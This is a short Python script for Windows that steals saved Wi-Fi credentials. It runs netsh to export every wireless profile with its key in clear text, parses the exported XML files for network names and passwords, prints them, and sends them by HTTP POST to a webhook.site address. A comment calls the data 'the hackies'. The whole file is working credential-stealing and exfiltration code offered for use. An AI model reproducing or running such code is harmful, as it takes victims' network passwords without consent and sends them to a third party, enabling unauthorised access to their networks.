import subprocess
import os
import requests
import xml.etree.ElementTree as ET

#url to send the hackies
url = "https://webhook.site/27249c99-075e-4c63-a394-ce0b684d65a2"

# Function to extract Wi-Fi credentials
def extract_wifi_credentials():
    try:
        # Execute windows commands
        command_output = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True).stdout.decode()

        # Grab the directory where the script is located
        script_directory = os.path.dirname(os.path.abspath(__file__))

        # Lists
        SSID = []
        password = []

        # Loop through Wi-Fi files
        for filename in os.listdir(script_directory):
            if filename.startswith("Wi-Fi") and filename.endswith(".xml") or filename.startswith("WiFi") and filename.endswith(".xml"):
                file_path = os.path.join(script_directory, filename)
                tree = ET.parse(file_path)
                root = tree.getroot()

                # Find the name under the WLAN Profile element
                wlan_name = root.find(".//{http://www.microsoft.com/networking/WLAN/profile/v1}name").text

                with open(file_path, "r") as f:
                    f_lines = f.readlines()
                    for line in f_lines:
                        if "<keyMaterial>" in line:
                            pass_line = line.strip()[13:-14]
                            password.append(pass_line)

                SSID.append(wlan_name)

        # Print or log extracted credentials
        for x, y in zip(SSID, password):
            print(f"SSID: {x}, Password: {y}")

        # Send credentials to the specified URL
        send_credentials(SSID, password)

    except Exception as e:
        print(f"An error occurred: {str(e)}")

# Function to send credentials to the specified URL
def send_credentials(SSID, password):
    try:
        payload = {"SSID": SSID, "password": password}
        response = requests.post(url, json=payload)

        print(f"Credentials sent. Response: {response.text}")

    except Exception as e:
        print(f"Error sending credentials: {str(e)}")

# Run the script
extract_wifi_credentials()
